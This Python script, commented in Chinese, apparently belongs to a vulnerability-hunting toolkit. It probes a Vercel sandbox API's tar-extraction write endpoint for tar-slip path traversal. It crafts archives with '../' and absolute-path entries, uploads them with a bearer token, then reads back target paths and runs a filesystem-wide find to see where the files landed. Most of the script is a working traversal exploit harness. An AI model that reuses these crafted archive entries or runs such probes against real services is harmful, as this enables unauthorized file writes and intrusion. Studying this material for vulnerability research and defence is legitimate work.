# -*- coding: utf-8 -*-
"""非传统面F2: fs/write tar 提取面 — ①正常 tar 条目落点 ②tar-slip 穿越条目 ③提取根与 path query 关系"""
import json, sys, time, io, tarfile, gzip, requests
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TOKEN, TEAM, PROJ, BASE

def log(s): print(s, flush=True)

api("DELETE", "/v2/sandboxes/n24?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n24"}, 60)
sid = json.loads(r)['sandbox']['currentSessionId']
log('sid=%s' % sid)
time.sleep(3)

hdr = {'Authorization': 'Bearer %s' % TOKEN, 'Content-Type': 'application/gzip'}

def make_targz(entries):
    """entries: [(name, content_bytes)] → tar.gz bytes"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        for name, content in entries:
            ti = tarfile.TarInfo(name)
            ti.size = len(content)
            tf.addfile(ti, io.BytesIO(content))
    return buf.getvalue()

def send(tag, targz, query):
    try:
        rr = requests.post('%s/v2/sandboxes/sessions/%s/fs/write?teamId=%s%s' % (BASE, sid, TEAM, query),
                           headers=hdr, data=targz, timeout=30)
        log('[%s] -> %s | %s' % (tag, rr.status_code, rr.text[:400].replace(chr(10), ' ')))
    except Exception as e:
        log('[%s] err %s' % (tag, e))

# ① 合法 tar: 正常条目 + 路径 query 变化
log('===== ① 正常 tar =====')
tgz = make_targz([('inner/hello.txt', b'TAR_HELLO_2026'), ('rootfile.txt', b'TAR_ROOT_2026')])
send('tar-nopath', tgz, '')
send('tar-path-tmp', tgz, '&path=/tmp/tardest')
send('tar-path-vercel', tgz, '&path=/vercel/tardest2')

# ② tar-slip: 穿越 + 绝对路径条目
log('')
log('===== ② tar-slip =====')
tgz2 = make_targz([
    ('../../../../tmp/tar_slip.txt', b'TAR_SLIP_2026'),
    ('/tmp/tar_abs.txt', b'TAR_ABS_2026'),
    ('../tar_parent.txt', b'TAR_PARENT_2026'),
])
send('slip-nopath', tgz2, '')
send('slip-path-tmp', tgz2, '&path=/tmp/tardest3')

# ③ 读回验证
log('')
log('===== ③ 落点验证 =====')
for p in ['/tmp/inner/hello.txt', '/tmp/tardest/inner/hello.txt', '/vercel/tardest2/inner/hello.txt',
          '/tmp/tar_slip.txt', '/tmp/tar_abs.txt', '/tmp/tar_parent.txt', '/tmp/tardest3/tar_slip.txt',
          '/tmp/tardest3/tar_abs.txt', '/vercel/tar_slip.txt', '/vercel/tar_abs.txt',
          '/tmp/rootfile.txt', '/vercel/rootfile.txt', '/tmp/tardest/rootfile.txt']:
    c, r = api("POST", "/v2/sandboxes/sessions/%s/fs/read?teamId=%s" % (sid, TEAM), {"path": p}, 20)
    log('read %s -> %s | %s' % (p, c, (r or '')[:80].replace(chr(10), ' ')))

# ④ find 全盘找文件 (fs 无 find → 用 cmd)
c, r = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
           {"command": "sh", "args": ["-c", "find / -name '*TAR*' -o -name 'hello.txt' 2>/dev/null | head -20"],
            "wait": True, "timeout": 10000, "logs": True}, 30)
log('find -> %s | %s' % (c, (r or '').replace(chr(10), ' ')))

api("DELETE", "/v2/sandboxes/n24?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
